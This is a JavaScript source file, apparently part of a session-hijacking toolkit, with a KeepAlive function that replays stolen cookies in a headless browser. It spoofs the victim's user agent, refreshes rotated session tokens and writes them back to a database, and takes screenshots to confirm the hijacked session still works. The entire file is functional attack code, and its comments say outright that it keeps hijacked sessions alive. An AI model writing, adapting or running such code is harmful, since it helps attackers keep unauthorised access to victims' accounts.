const necrohelp = require('../helpers/necrohelp')
const db = require('../../db/db')

// KeepAlive loads a task's fixSession URL with its cookies and UA,
// then harvests fresh cookies from the browser and writes them back to Redis.
// This keeps hijacked sessions alive and ensures cookie rotation is handled.
exports.KeepAlive = async ({ page, data: [taskId, cookies, params] }) => {
    const fixSession = params.fixSession;
    console.log(`[${taskId}] keepalive: loading ${fixSession}`);

    try {
        // Set cookies from Redis (these may have been refreshed by a previous keepalive)
        if (cookies && cookies.length > 0) {
            const urlObj = new URL(fixSession);
            await necrohelp.SetCookies(page, cookies, {
                url: urlObj.origin + '/'
            });
        }

        // Configure UA to match the victim's browser fingerprint
        await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);

        // Navigate to fixSession URL
        await page.goto(fixSession, { waitUntil: 'networkidle2', timeout: 30000 });
        await necrohelp.Sleep(2000);

        // Harvest fresh cookies from the browser after page load
        // The server may have rotated tokens via Set-Cookie headers
        const freshBrowserCookies = await page.cookies();

        if (freshBrowserCookies.length > 0) {
            // Merge: use a Map keyed by name+domain+path for dedup
            const cookieMap = new Map();

            // Start with original cookies
            for (const c of cookies) {
                const key = `${c.name}|${c.domain || ''}|${c.path || '/'}`;
                cookieMap.set(key, c);
            }

            // Overwrite/add with fresh browser cookies
            for (const fc of freshBrowserCookies) {
                const key = `${fc.name}|${fc.domain || ''}|${fc.path || '/'}`;
                cookieMap.set(key, fc);
            }

            const mergedCookies = Array.from(cookieMap.values());
            const b64Cookies = Buffer.from(JSON.stringify(mergedCookies, null, 4)).toString('base64');
            await db.UpdateTaskCookies(taskId, b64Cookies);

            console.log(`[${taskId}] keepalive: cookies refreshed (${cookies.length} -> ${mergedCookies.length})`);
        }

        // Take a screenshot as evidence of session being alive
        await necrohelp.ScreenshotCurrentPage(page, taskId);

        // Update keepalive timestamp
        await db.UpdateTaskLastKeepalive(taskId);

        console.log(`[${taskId}] keepalive: completed successfully`);
    } catch (e) {
        console.error(`[${taskId}] keepalive error: ${e.message}`);
        // Don't mark the original task as error - keepalive failure is non-fatal
    }
}
